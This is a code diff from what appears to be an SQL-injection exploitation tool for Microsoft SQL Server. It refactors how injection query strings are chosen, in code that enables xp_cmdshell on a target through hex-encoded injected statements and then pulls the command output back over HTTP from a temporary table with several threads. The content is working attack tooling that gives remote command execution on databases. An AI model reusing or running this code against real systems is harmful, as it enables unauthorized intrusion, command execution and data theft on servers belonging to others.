@@ -143,14 +143,22 @@ class Worker(QtCore.QThread):
         self.progressSignal.emit(0, True)
         self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
     
+    def injType(self, query):
+        #Define query string for current injection type
+        if self.vars['inj_type'] == "union-based":
+            qstring = self.qstrings.value('mssql_union_based/' + query)
+        else:
+            qstring = self.qstrings.value('mssql_error_based/' + query)
+        return qstring
+        
     def enable_xp_cmd(self):
         hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
-        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
+        query =  self.wq.buildQuery(self.qstrings.value('mssql_error_based/exec_hex'), self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
     def xp_cmdshell(self):
-        execStr = core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex'])
+        execStr = self.qstrings.value('mssql_error_based/exec_hex')
         
         #Delete tmp_table if already exist
         hex = core.txtproc.strToHex("drop table dtpropertie", True)
@@ -169,15 +177,9 @@ class Worker(QtCore.QThread):
         query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
-        #Define query string for current injection type
-        if self.vars['inj_type'] == "union-based":
-            self.qstrings = self.qstrings['mssql_union_based']
-        else:
-            self.qstrings = self.qstrings['mssql_error_based']
-        
         #Getting count of rows in temp table
         self.vars['query_cmd'] = "select count(*) from dtpropertie"
-        query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['query']), self.vars)
+        query = self.wq.buildQuery(self.injType('query'), self.vars)
         rowCount = self.wq.httpRequest(query, False, self.vars)
         if rowCount == "no_content":
             return
@@ -200,13 +202,12 @@ class Worker(QtCore.QThread):
             
     #Multithreaded xp_cmdshell output extracting
     def mtCmdOutput(self, tNum, tQueue, rowCount):
-        getRowStr = core.txtproc.correctQstr(self.qstrings['get_row'])
         while not self.killed: 
             try:  
                 tNum = tQueue.get_nowait()
             except Exception:  
                 break
-            query = self.wq.buildQuery(getRowStr, self.vars, {'num' : str(tNum)})
+            query = self.wq.buildQuery(self.injType('get_row'), self.vars, {'num' : str(tNum)})
             cmdResult = self.wq.httpRequest(query, False, self.vars)
             if cmdResult == "no_content":
                 self.log(sys._getframe().f_code.co_name + "() -> cmdResult", False)
